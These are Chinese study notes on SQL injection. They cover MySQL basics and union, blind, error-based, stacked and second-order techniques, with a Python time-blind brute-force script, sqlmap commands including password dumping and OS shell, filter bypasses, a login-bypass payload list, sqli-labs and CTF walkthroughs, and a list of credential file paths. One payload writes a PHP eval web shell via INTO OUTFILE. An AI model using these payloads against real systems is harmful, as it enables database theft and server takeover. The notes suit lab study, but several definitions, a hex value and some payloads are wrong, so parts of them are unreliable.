# SQL注入

课程来源：[0x003-增删改第一部分_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1c34y1h7So?p=3&vd_source=f264368eefdba6c9e52d63931d176453)

参考资料：[从零开始学SQL注入（sql十大注入类型）：技术解析与实战演练 - 白小雨 - 博客园 (cnblogs.com)](https://www.cnblogs.com/xiaoyus/p/18418583)

参考资料：[SQL注入(巨详解) - 美式加糖 - 博客园 (cnblogs.com)](https://www.cnblogs.com/peace-and-romance/p/15890387.html#0x00-引言)

参考资料：[kali——sqlmap的使用_kali sqlmap-CSDN博客](https://blog.csdn.net/bunengyongzho666/article/details/141652728)

参考资料：[【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_sqlmap使用教程-CSDN博客](https://blog.csdn.net/weixin_43819747/article/details/136736688)



mysql5.0之后默认存在`information_schema` 的数据库，里面的表都是只读，其中有三个很重要的表

- schemata：存储数据库中所有数据库的库名
- tables：存储所有表名
- columns：存储所有列的列名





## 1.基本增删查改

```bash
mysql -u root -p
```



**查看数据库**

```sql
show database;
```



创建数据库

```sql
create database xxx;
```



删除数据库

```sql
drop database xxxx;
```



进入数据库

```sql
use xxxx;
```



创建数据表，要进入某个库才能执行这个指令

```sql
create table xxxx;
```



创建表格信息

```sql
create table xxxx(id int,name varchar(40),sex char(4),birthday date,job varchar(100));
```



查看数据表信息

```sql
show full columns from xxxx;
```



**查看数据表列表**

```sql
select * from xxxx;
```



删除数据表

```sql
drop table employee;
```



修改名字

```sql
rename table xxxx to xxx;
```



修改字符级

```sql
alter table xxx character set utf8;
```



插入数据

```sql
insert into xxx(id,name,sex,birthday,job) values(1,'xxxx','xxxxx','xxxx','xxxx');
```



修改所有数值

```sql
update user set salary=5000;
```



**修改id=1的行数值为指定值**

```sql
update user set name='xxxx' where id=1;
```



修改两个数值直接加逗号

```sql
update user set name='xxxx',salary=3000 where id=1;
```



删除列

```sql
alter table user drop salary;
```



删除行,删除job为xxx的那一行

```sql
delete from user where job='xxx';
```



删除表

```sql
delete from user;
```





## 2.查询重点

| 基础查询词语 | `select`  `from`  `where`                            |
| ------------ | ---------------------------------------------------- |
| 基本查询语句 |                                                      |
| 查询参数指令 | `union`  `group by`  `order by`  `limit`  `and` `or` |
| 常用函数     | `group_concat()`  `database()`  `version()`          |



基本查询

```sql
select * from users where id =1;
```



从user表格查询所有包含id为3

```sql
select * from users where id in('3');
```



子查询 优先执行( )内查询语句

```sql
select * from users where id=(select id from users where username=('admin'));
```



**union**

```sql
select id from users union select email_id from emails;
```

查询并合并数据显示，先显示前面查询的结果，然后显示后面的结果

==union查询前后表格列数必须相等，否则会报错==



可以选择填充列数进行绕过

```sql
select * from users where id=6 union select *,3 from emails where id=6;
```



**group by**

```sql
select department,count(id) from student group by department;
```

查询department院系人数，count(id)对ID进行计数



经验之举：

使用二分法判断数据表列数

```sql
select * from users where id=9 group by 2;
select * from users where id=9 group by 4;
...

#直到报错为止
```



**order by**

默认按照升序排列

```sql
select stu_id from score shere c_name='计算机' order by grade desc;
```

grade 参数 desc 使排列变为降序



```sql
select * from users order by 1;
```

按照第一列的信息进行升序排序



**limit**

限制输出内容数量

```sql
select * from users limit 0,3;
```

限制为从第一行开始显示3行



**and**

与

```sql
select * from Axxxx where Bxxx='xxxx' and Cxxx='xxxx';
```

同时满足两个条件



**or**

或

```sql
select * from Axxxx where Bxxx='xxxx' or Cxxx='xxxx';
```

满足条件之一即可



**group_concat**

合并到一行显示，多行变一行

```sql
select group_concat(id,user) from users;
```



**select database( )**

查看当前数据库名字



**select version( )**

查询当前数据库版本



```
-------------------------------------
version():查询数据库的版本
user():查询数据库的使用者
database():数据库
system_user():系统用户名
session_user():连接数据库的用户名
current_user():当前用户名
load_file():读取本地文件
@@datadir:读取数据库路径
@@basedir:mysql安装路径
@@version_complie_os:查看操作系统
-------------------------------------
```



## MySQL注释符

支持三种注释符



- #
- --
- /**/ 



```
/*! 55555,username*/
/*  55555,username*/
```

mysql版本高于或等于5.55.55，语句将会被执行，如果!后面不加版本号，mysql将会直接执行SQL语句









## 3.SQL注入基础

| 分类依据       | 类型                                                         |
| :------------- | :----------------------------------------------------------- |
| 获取信息的方式 | 布尔盲注，时间盲注，报错注入 ，union查询注入，堆叠注入等     |
| 提交方式       | GET、POST、COOKIE、HTTP 注入等                               |
| 注入点类型     | 数字类型的注入、字符串类型的注入、搜索型注入等               |
| 其他注入       | 二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等 |



按照查询字段的类型可以分为字符型和数字型

按照注入方法分为Union注入，报错注入，布尔注入，时间注入



字符型

输入参数为整数，认为是数字型注入



数字型

输入参数为字符串时，称为字符型





判断字符型和数字型

```
and 1=1
and 1=2
?id=1 and 1=1 
```

如果提交之后都能够正常显示就是为字符型注入，而字符型需要闭合符



```
?id='1 and 1=1'
```



闭合方式：

| ''   | ""   | ')   | ")   | 其他 |
| ---- | ---- | ---- | ---- | ---- |



不需要的语句可以使用下面的注释符号进行注释

- --+
- #
- %23



示例

union联合注入

```
?id=1' union select database() --+
```



 

## 4.判断SQL注入

- 查找注入点
- 判断字符型还是数字型 and 1=1 1=2  2-1
- 如果是字符型找到他的闭合方式' " ')  "),就是去试
- 判断查询列数group by order by
- 查询回显位置 -1



```
id=1   #判断注入点
id=1'  #判断注入点
id=1' and 1=1  #判断注入点
id=1' and 1=2  #判断注入点
id=1' order by 3 --+  #判断字段数
id=-1' union select 1,database(),user() --+  #查询库名与用户
id=-1' union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+  #查询表名
?id=-1' union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='emails' ) --+  #查询字段名
id=-1' union select 1,database(),(select group_concat(id,email_id) from emails  ) --+  #查询数据

```





如果是数字型：

```
id=2 #原始请求
id=2' #页面出现异常，则进行下一步测试
id=2 and 1=1 #语句执行正常，返回数据与原始请求无任何差异
id=2 and 1=2 #语句执行正常，但无法查询出数据，and1=2始终为假，所以返回数据与原始数据有差异
```



### 布尔盲注

可能存在布尔盲注：

```
id=2 #原始请求
id=2' #页面不显示数据
```

布尔盲注就使用length去判断数据库长度

```
id=1' and length(database())==8 #
```

当试到显示数据，就表明长度正确

然后一个一个去试字符

```
?id=1' and substr(database(),1,1)='s' --+
```

可以写脚本，一位一位爆破

爆完库，就爆表

```
?id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e' --+
```

爆段

```
?id=1' and substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)='d' --+
```

爆内容

```
?id=1' and substr((select email_id from emails limit 0,1),1,1)='x' --+
```

这里可以写个脚本进行爆破

或者使用sqlmap进行布尔盲注



### 时间盲注

也是页面不返回任何信息，采用延迟函数根据页面反应的时间进行判断是否存在注入点，当延时设置得足够长，就可以忽略掉服务器和网络速度带来的延时误差了

```
?id=1' and if(length(database())>1,sleep(6),1) --+
```

当判断存在时间盲注，那么就是正常流程



爆库名

```
?id=1' and if(substr(database(),1,1)='s',sleep(6),1) --+
```

爆表名

```
?id=1' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',sleep(6),1) --+
```

爆字段名

```
?id=1' and if(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)='d',sleep(6),1) --+
```

爆字段内容

```
?id=1' and if(substr((select email_id from emails limit 0,1),1,1)='x',sleep(6),1) --+
```





#### 另外：

参考资料：

[超硬核，SQL注入之时间盲注，原理+步骤+实战思路-CSDN博客](https://blog.csdn.net/wangyuxiang946/article/details/123857045)



基于时间的盲注，延时注入，但是优先级不高，实际操作时先考虑联合注入、报错注入、布尔盲注

使用场景：

1. 页面没有回显位置（联合注入无法使用
2. 页面不显示数据库的报错信息（报错注入无法使用
3. 无论成功还是失败，页面只响应一种结果（布尔盲注无法使用



使用步骤：

1. 判断注入点
2. 判断长度
3. 枚举字符



判断是否存在时间盲注

```
?id=1' and if(1,sleep(5),3) --+        #延时5s响应
?id=1' and if(0,sleep(5),3) --+        #正常响应
```

即存在盲注

判断注入点就是，测试payload，若是延时5s就说明注入存在





```
?id=1 and if(1,sleep(5),3) --+
?id=1' and if(1,sleep(5),3) --+
?id=1" and if(1,sleep(5),3) --+
```



判断长度就是去尝试

```
?id=1' and if((length(查询语句) =1), sleep(5), 3) --+
?id=1' and if((length(查询语句) =2), sleep(5), 3) --+
?id=1' and if((length(查询语句) =3), sleep(5), 3) --+
....
```

一直试到延时5s产生，即是这个长度



然后枚举字符，这里就不用列出来全部字符了，直接使用ASCII码进行判断，从32开始判断，一直递增到126



```
?id=1' and if((ascii(substr(查询语句,1,1)) =1), sleep(5), 3) --+
```





时间盲注容易受到网络波动等因素的影响，从而产生误差。

枚举字符

```
?id=1' and if(ascii(substr(database(),1,1))>1),sleep(5),3) --+
```



总的来说，爆破脚本如下：

```py
import requests
import time

# 将url 替换成你的靶场关卡网址
# 修改两个对应的payload

# 目标网址（不带参数）
url = "http://0f3687d08b574476ba96442b3ec2c120.app.mituan.zone/Less-9/"
# 猜解长度使用的payload
payload_len = """?id=1' and if(
	(length(database()) ={n})
,sleep(5),3) -- a"""
# 枚举字符使用的payload
payload_str = """?id=1' and if(
	(ascii(
		substr(
		(database())
		,{n},1)
	) ={r})
, sleep(5), 3) -- a"""

# 获取长度
def getLength(url, payload):
    length = 1  # 初始测试长度为1
    while True:
        start_time = time.time()
        response = requests.get(url= url+payload_len.format(n= length))
        # 页面响应时间 = 结束执行的时间 - 开始执行的时间
        use_time = time.time() - start_time
        # 响应时间>5秒时，表示猜解成功
        if use_time > 5:
            print('测试长度完成，长度为：', length,)
            return length;
        else:
            print('正在测试长度：',length)
            length += 1  # 测试长度递增

# 获取字符
def getStr(url, payload, length):
    str = ''  # 初始表名/库名为空
    # 第一层循环，截取每一个字符
    for l in range(1, length+1):
        # 第二层循环，枚举截取字符的每一种可能性
        for n in range(33, 126):
            start_time = time.time()
            response = requests.get(url= url+payload_str.format(n= l, r= n))
            # 页面响应时间 = 结束执行的时间 - 开始执行的时间
            use_time = time.time() - start_time
            # 页面中出现此内容则表示成功
            if use_time > 5:
                str+= chr(n)
                print('第', l, '个字符猜解成功：', str)
                break;
    return str;

# 开始猜解
length = getLength(url, payload_len)
getStr(url, payload_str, length)
```



误差判断，多试几下就可以了



### 报错注入

updatexml：

```
updatexml(Xml_document,Xpathstring,new_value)
    Xml_document：目标文档
    Xpathstring：路径
    new_value：更新的值

爆数据库名：
username=1' and updatexml(1,concat(0x7e,(database()),0x7e),1) --+
爆数据库表名：
username=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e),1) --+
爆字段名：
username=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) --+
爆数据值：
username=1' and updatexml(1,substring(concat(0x7e,(select group_concat(username,0x3a,password,0x3a) from test.users),0x7e),32,64),1) --+
```



extractvalue：

```
extractvalue(Xml_document,XMLstring)
    Xml_document：目标文档
    Xpathstring：XML路径
爆数据库名：
username=1' union select 1,(extractvalue(1,concat(0x7e,(select database())))) --+
爆数据库表名：
username=1' union select 1,(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='test')))) --+
爆字段名：
username=1' union select 1,(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='test' and table_name='users'))))--+
爆数据值：
username=1' union select 1,(extractvalue(1,concat(0x7e,(select group_concat(id,0x3a,username,0x3a,password) from security.users)))) --+
```



floor：

```
爆数据名：username=1' and (select 1 from  (select count(*),concat(database(),floor(rand(0)*2))x from  information_schema.tables group by x)a) --+
```



### 堆叠注入

多条SQL语句一起执行，每条语句中间用;隔开---

如登录页面：

```
username：aaa
password:bbb';insert into users(id,username,password) values(60,'root','root')#
```



### 二次注入

将攻击语句写入数据库，然后第二次SQL注入调用该攻击语句进行注入



新注册用户：

```
username : admin'#
password : 123
```

如果没有限制的话，会生成一个新的admin账户，并且可以使用密码123进行登录



### 宽字节注入

宽字节注入是通过编码绕过后端代码的防御措施

暂时不表





### Cookie注入

后端对Cookie没有过滤





## sqlmap工具

官解：

中文版：

```bash
root@kali:~# sqlmap -h
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

用法: python3 sqlmap [选项]

选项:
  -h, --help            显示基本帮助信息并退出
  -hh                   显示高级帮助信息并退出
  --version             显示程序版本号并退出
  -v VERBOSE            详细级别: 0-6（默认 1）

  目标:
    必须提供至少一个选项以定义目标

    -u URL, --url=URL   目标 URL（例如 "http://www.site.com/vuln.php?id=1"）
    -g GOOGLEDORK       将 Google dork 结果作为目标 URL 处理

  请求:
    这些选项可以用来指定如何连接到目标 URL

    --data=DATA         通过 POST 发送的数据字符串（例如 "id=1"）
    --cookie=COOKIE     HTTP Cookie 头值（例如 "PHPSESSID=a8d127e.."）
    --random-agent      使用随机选择的 HTTP User-Agent 头值
    --proxy=PROXY       使用代理连接到目标 URL
    --tor               使用 Tor 匿名网络
    --check-tor         检查 Tor 是否正确使用

  注入:
    这些选项可以用来指定要测试的参数，提供自定义注入载荷和可选的篡改脚本

    -p TESTPARAMETER    可测试的参数
    --dbms=DBMS         强制后端 DBMS 使用提供的值

  检测:
    这些选项可以用来自定义检测阶段

    --level=LEVEL       执行的测试级别（1-5，默认 1）
    --risk=RISK         执行的测试风险（1-3，默认 1）

  技术:
    这些选项可以用来调整特定 SQL 注入技术的测试

    --technique=TECH..  要使用的 SQL 注入技术（默认 "BEUSTQ"）

  枚举:
    这些选项可以用来枚举后端数据库管理系统的信息、结构和表中的数据

    -a, --all           检索所有内容
    -b, --banner        检索 DBMS 横幅
    --current-user      检索 DBMS 当前用户
    --current-db        检索 DBMS 当前数据库
    --passwords         枚举 DBMS 用户密码哈希
    --dbs               枚举 DBMS 数据库
    --tables            枚举 DBMS 数据库表
    --columns           枚举 DBMS 数据库表列
    --schema            枚举 DBMS 架构
    --dump              转储 DBMS 数据库表条目
    --dump-all          转储所有 DBMS 数据库表条目
    -D DB               要枚举的 DBMS 数据库
    -T TBL              要枚举的 DBMS 数据库表
    -C COL              要枚举的 DBMS 数据库表列

  操作系统访问:
    这些选项可以用来访问后端数据库管理系统的底层操作系统

    --os-shell          提示以获取交互式操作系统 shell
    --os-pwn            提示以获取 OOB shell、Meterpreter 或 VNC

  一般:
    这些选项可以用来设置一些通用工作参数

    --batch             从不询问用户输入，使用默认行为
    --flush-session     刷新当前目标的会话文件

  杂项:
    这些选项不属于任何其他类别

    --wizard            初学者用户的简单向导界面

[!] 要查看完整选项列表，请运行 '-hh'
```



kali自带，windows直接使用sqlmap.py即可

使用案例：



检测注入点

```
sqlmap -u url             //检测过程中需要手动输入y/n，即是否继续进行sql注入检测
sqlmap -u url --batch     //检测过程中默认继续进行sql注入检测
```



查看所有数据库

```
sqlmap -u url --dbs
```



查看当前网站使用的数据库，

```
sqlmap -u url --current-db
```

假设是security



查看数据表

```
sqlmap -u url -D 'security' --tables
```

假设有一张表为users



查看字段

```
sqlmap -u url -D 'security' -T 'users' --columns
```



查看字段数据

```
sqlmap -u url -D 'security' -T 'users' --dump
```



查看所有用户

```
sqlmap -u url --users
```



查看当前数据库用户

```
sqlmap -u url --current-user
```



获取数据库用户密码

```
sqlmap -u url --passwords
```



查看用户权限

```
sqlmap -u url --privileges
```



查看当前数据库用户是否为管理员

```
sqlmap -u url --is-dba
```



批量自动化扫描

```
sqlmap -m xxx.txt
```



--level参数

```
sqlmap -u url --level 等级
```

指定构造payload的复杂度，当默认等级无法注入时，可以尝试使用高level







## 绕过姿势

### 空格绕过

- 注释符绕过

```
select/**/user,passwd/**/from/**/usrs; 
```

- 括号代替空格，时间盲注居多

```
sleep(ascii(mid(database()from(1)for(1)))=109)
```

- %0a代替空格，最常用

```
%0a
```



### 引号绕过

```
十六进制绕过
select group_concat(table_name) from information_schema.tables where table_schema='security';

select group_concat(table_name) from information_schema.tables where table_schema=2773656375726974792720
```



### 逗号绕过

```
from for绕过
select substr(database(),1,1);
select substr(database() from 1 for 1);
offset绕过
select * from users limit 0,1;
select * from users limit 0 offset 1;
```



### <>绕过

绕过比较符号`<` `>`,使用函数greatest()、least()，greatest()返回最大值，least()返回最小值

```
select * from usrs where id=1 and ascii(substr(database(),0,1))>64;
select * from usrs where id=1 and greatest(ascii(substr(database(),0,1)),64)=64;
```



### 关键词绕过

- 注释符绕过

```
常用注释符
//，-- , /**/, #, --+, -- -, ;,%00,--a
用法：
sel/**/ect * from users un/**/ion select passwd from emils wh/**/ere limit 0,1;
```



- 大小写绕过

```
select * from users UnIon select passwd from emils WheRe limit 0,1;
```

- 内联注释绕过

```
select * from users /*!union*/ select passwd from emils /*!where*/ limit 0,1;
```

- 双写绕过

```
select * from users unUnionion select passwd from emils where limit 0,1;
```



## xx。万能密码

```
username : 1' or '1'='1
password : 1' or '1'='1
```



```
' or 1='1
'or'='or'
admin
admin'--
admin' or 4=4--
admin' or '1'='1'--
admin888
"or "a"="a
admin' or 2=2#
a' having 1=1#
a' having 1=1--
admin' or '2'='2
')or('a'='a
or 4=4--
c
a'or' 4=4--
"or 4=4--
'or'a'='a
"or"="a'='a
'or''='
'or'='or'
1 or '1'='1'=1
1 or '1'='1' or 4=4
'OR 4=4%00
"or 4=4%00
'xor
admin' UNION Select 1,1,1 FROM admin Where ''='
1
-1%cf' union select 1,1,1 as password,1,1,1 %23
1
17..admin' or 'a'='a 密码随便
'or'='or'
'or 4=4/*

something
' OR '1'='1
1'or'1'='1
admin' OR 4=4/*
1'or'1'='1
 
```









## xxx.SQL-labs

### Less-1

判断字符和数字型

```
?id=1'
```



判断列数，4不行，3可以，那就是3列



id=-1，两个sql语句进行联合操作时，当前的一个语句选择的内容为空，我们就将后面的语句的内容显示出来

```
?id=-1' order by 4 --+
```

order by 或是 group by 都是用来判断列数的，后面查询要改为union



union联合查询列，记得database();后面有个分号，--+或者#

```
?id=-1' union select 1,2,database(); --+
```

查找一个数据库名称为security



group_concat 用在分组查询中，可以将组内多个值连接成一个字符串

则 ==information_schema==

```
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
```

查找出emails,referers,uagents,users

```
http://0192c6a0c58c71c29755fafdf21344df.qa8u.dg10.wangdingcup.com:43008/OA_announcement.php?id=-1 union select id= -1,group_concat(OAname),group_concat(PassWord),4 from OA_Users
```



然后可以查询表名的数据

```
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='user'--+
```



然后继续往下面查

查询字段的值

```
?id=-1' union select 1,2,group_concat(username) from security.users --+
```



找到敏感字段进行查询

```
?id=-1' union select 1,2,group_concat(password) from security.users --+
```





如果是常规流程，操作应该如下进行查询



指定数据库库名，进行查询表名

```sal
group_concat(table_name) from information_schema.tables where table_schema= 'xxx' --+
```



指定该数据库的库名，再指定表名，进行查询列名

```
group_concat(column_name) from information_schema.columns where table_name='user'--+
```





### Less-2

基于错误的的GET整型注入



```
?id=1 order by 3 --+
```



```
?id=1 and 1=2 union select 1,2,3; --+
```



```
?id=1 and 1=2 union select 1,2,database(); --+
```



```
?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```



```
?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```



```
?id=1 and 1=2 union select 1,2,group_concat(username) from security.users --+
```



```
?id=1 and 1=2 union select 1,2,group_concat(password) from security.users --+
```





### Less-3

基于错误的GET单引号变形字符型注入



```
?id=-1') order by 3 --+
```



```
?id=-1') union select 1,2,database(); --+
```



```
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```



```
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```



```
?id=-1') union select 1,2,group_concat(username) from security.users --+
```



```
?id=-1') union select 1,2,group_concat(password) from security.users --+
```



### Less-4

基于错误的GET双引号字符型注入



```
?id=-1") order by 3 --+
```



```
?id=-1") union select 1,2,3 --+
```

```
?id=-1") union select 1,2,database(); --+
```



```
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```



```
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```



```
?id=-1") union select 1,2,group_concat(username) from security.users --+
```



```
?id=-1") union select 1,2,group_concat(password) from security.users --+
```



### Less-5

双注入GET单引号字符型注入

```
?id=1' and sleep(5) --+
```

发现响应延迟



```
?id=1' and length(database())=8 --+
```



然后进行一位一位的爆库

0123456789qazwsxedcrfvtgbyhnujmikolp 进行爆库



```
?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) -- +
```

可以根据时间响应来判断全部字符



爆表

```
?id=1' and if(substr(select table_ name from information_schema.tables where table_schema=database(),%d,1))
```



爆列

```
?id=1' and if(substr(select columns_name from infomation_schema.columns where table_shema=database(),%d,1))
```



#### 方法其他

自己做的

```
?id=1' and if(length(database())=8,sleep(5),3) --+
```



好像并不需要时间盲注

```
?id=1' and length(database())=8 --+
```



然后猜表

判断database的第一位字符是否大于字符‘a’，这里写脚本可以使用二分法进行快速查找

```
?id=1' and left(database(),1)>'a' --+
```







### Less-7

dump into outfile

```
?id=1')) or 1=1 --+
```



一句话木马导入

```
?id=1')) union select 1,2,'<?php @eval($_post["a"])?>' into outfile "c:\\wamp\\www\\sqllib\\Less-7\\1.php" --+
```



然后使用蚁剑进行连接，密码为a







### 南京邮电大学晨跑打卡NCTF



#### 知识点学习

发现过滤了空格，直接用%0a替代空格，%a0and%a0%271%27=%271替代--+进行代码闭合，或者%a0||%27替代--+

%27替代'

而且发现waf限制--+和#



#### 官方WP

```
id=0'%a0union%a0select%a0'1','2','3','4
```

```
id=0'%a0union%a0select%a01,database(),3,'4# 当前数据库：cgctf
```

```
id=0'%a0union%a0select%a01,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),3,'4    #查询所有数据库
```

```
id=0'%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='cgctf'),3,'4    #查询cgctf的所有表：pcnumber
```

```
id=0'%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='pcnumber'),3,'4    #查询pcnumber表的所有字段，存在flag列
```

```
id=0'%a0union%a0select%a01,(select%a0group_concat(flag)%a0from%a0pcnumber),3,'4    #查询flag列的所有值
```



#### CSDNWP

%a0and%a0%271%27=%271替代--+和#

判断列数

```
1' order by 4 --+
```

```
1%27%0aorder%0aby%0a1%a0||%27
```



爆库

```
1' union select 1,database(),3,4 --+
```

```
1%27%a0union%a0select%a01,database(),3,4%a0||%27
```

发现database名为cgctf



```
1' and 1=2 union select 1,(select group_concat(schema_name) from information_schema.shemata),3,4 --+
```

```
1%27%a0and%a01=2%a0union%a0select%a01,(SELECT%a0GROUP_CONCAT(SCHEMA_NAME)%a0FROM%a0information_schema.SCHEMATA),3,4%a0and%a0%271%27=%271
```



爆表：

```
1'and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='cgctf' --+
```

```
1%27%a0and%a01=2%a0union%a0select%a01,group_concat(table_name),3,4%a0from%a0information_schema.tables%a0where%a0table_schema=%27cgctf%27%a0and%a0%271%27=%271
```



爆列：

```
1' and 1=2 union select 1,column_name,3,4 from information_schema.columns where table_name='pcnumber' #
```

```
1%27%a0and%a01=2%a0union%a0select%a01,column_name,3,4%a0from%a0information_schema.columns%a0where%a0table_name=%27pcnumber%27%a0||%27
```





爆字段：

```
1' and 1=2 union select 1,(select group_concat(flag) from cgctf.pcnumber),3,4 #
```

```
1%27%a0and%a01=2%a0union%a0select%a01,(select%a0group_concat(flag)%a0from%a0cgctf.pcnumber),3,4%a0||%27
```



#### MyWP

```
1' union select 1,database(),3,4 --+
```

```
1%27%a0union%a0select%a01,database(),3,4%a0||%27
```

查询到库名cgctf



```
1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='cgctf' --+
```

```
1'%a0union%a0select%a01,group_concat(table_name),3,4%a0from%a0information_schema.tables%a0where%a0table_schema='cgctf'%a0||%27
```

查询到表pcnumber，其实题目已经给了



然后可以查询表名的数据

```
1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='pcnumber'--+
```

```
1'%a0union%a0select%a01,group_concat(column_name),3,4%a0from%a0information_schema.columns%a0where%a0table_name='pcnumber'%a0||%27
```

查询到id,bigtime,smalltime,flag



然后继续往下面查

查询flag字段的值

注意看细节

```
1' union select 1,(select group_concat(flag) from cgctf.pcnumber),3,4 --+
```

```
1'%a0union%a0select%a01,(select%a0group_concat(flag)%a0from%a0cgctf.pcnumber),3,4%a0||%27
```



查询到flag

`flag{a3074919ab0bc09fc5945ceeeaf1674e}`









### sqli-0x1



```php
<?php
error_reporting(0);
error_log(0);

require_once("flag.php");

function is_trying_to_hak_me($str)
{   
    $blacklist = ["' ", " '", '"', "`", " `", "` ", ">", "<"];
    if (strpos($str, "'") !== false) {
        if (!preg_match("/[0-9a-zA-Z]'[0-9a-zA-Z]/", $str)) {
            return true;
        }
    }
    foreach ($blacklist as $token) {
        if (strpos($str, $token) !== false) return true;
    }
    return false;
}

if (isset($_GET["pls_help"])) {
    highlight_file(__FILE__);
    exit;
}
   
if (isset($_POST["user"]) && isset($_POST["pass"]) && (!empty($_POST["user"])) && (!empty($_POST["pass"]))) {
    $user = $_POST["user"];
    $pass = $_POST["pass"];
    if (is_trying_to_hak_me($user)) {
        die("why u bully me");
    }

    $db = new SQLite3("/var/db.sqlite");
    $result = $db->query("SELECT * FROM users WHERE username='$user'");
    if ($result === false) die("pls dont break me");
    else $result = $result->fetchArray();

    if ($result) {
        $split = explode('$', $result["password"]);
        $password_hash = $split[0];
        $salt = $split[1];
        if ($password_hash === hash("sha256", $pass.$salt)) $logged_in = true;
        else $err = "Wrong password";
    }
    else $err = "No such user";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Hack.INI 9th - SQLi</title>
</head>
<body>
    <?php if (isset($logged_in) && $logged_in): ?>
    <p>Welcome back admin! Have a flag: <?=htmlspecialchars($flag);?><p>
    <?php else: ?>
    <form method="post">
        <input type="text" placeholder="Username" name="user" required>
        <input type="password" placeholder="Password" name="pass" required>
        <button type="submit">Login</button>
        <br><br>
        <?php if (isset($err)) echo $err; ?>
    </form>
    <?php endif; ?>
    <!-- <a href="/?pls_help">get some help</a> -->
</body>
</html>
```



登录逻辑分析：

- 传入的username取找到users表中的记录
- 将查询到的记录存入result中，取出password字段
- 将上一步取到的password的值以$进行分割，第一部分是密码加密后的hash，第二部分是加密用的salt
- 将用户输入的password和salt进行拼接，拼接后的字符串进行sha256加密
- 最后将hash与上一步加密了的字符串进行比较，相同就打印flag





构造：

```
user=admin'union select 1,'52a6eb687cd22e80d3342eac6fcc7f2e19209e8f83eb9b82e81c6f3e6f30743b$1
pass=123
```



```python
import hashlib

password="123"
salt="1"

password_salt = password + salt

hash_object = hashlib.sha256(password_salt.encode())

hash_hex=hash_object.hexdigest()

print(hash_hex)
```









## 导入导出漏洞

常用文件路径

```
WINDOWS下:
c:/boot.ini //查看系统版本

c:/windows/php.ini //php配置信息

c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码

c:/winnt/php.ini

c:/winnt/my.ini

c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码

c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码

c:\Program Files\Serv-U\ServUDaemon.ini

c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置

c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码

c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此

c:\Program Files\RhinoSoft.com\ServUDaemon.exe

C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件

//存储了pcAnywhere的登陆密码

c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件

c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.

c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机

d:\APACHE\Apache2\conf\httpd.conf

C:\Program Files\mysql\my.ini

C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码

LUNIX/UNIX 下:
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件

/usr/local/apache2/conf/httpd.conf

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置

/usr/local/app/php5/lib/php.ini //PHP相关设置

/etc/sysconfig/iptables //从中得到防火墙规则策略

/etc/httpd/conf/httpd.conf // apache配置文件

/etc/rsyncd.conf //同步程序配置文件

/etc/my.cnf //mysql的配置文件

/etc/redhat-release //系统版本

/etc/issue

/etc/issue.net

/usr/local/app/php5/lib/php.ini //PHP相关设置

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置

/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件

/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看

/usr/local/resin-pro-3.0.22/conf/resin.conf 同上

/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看

/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件

/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看

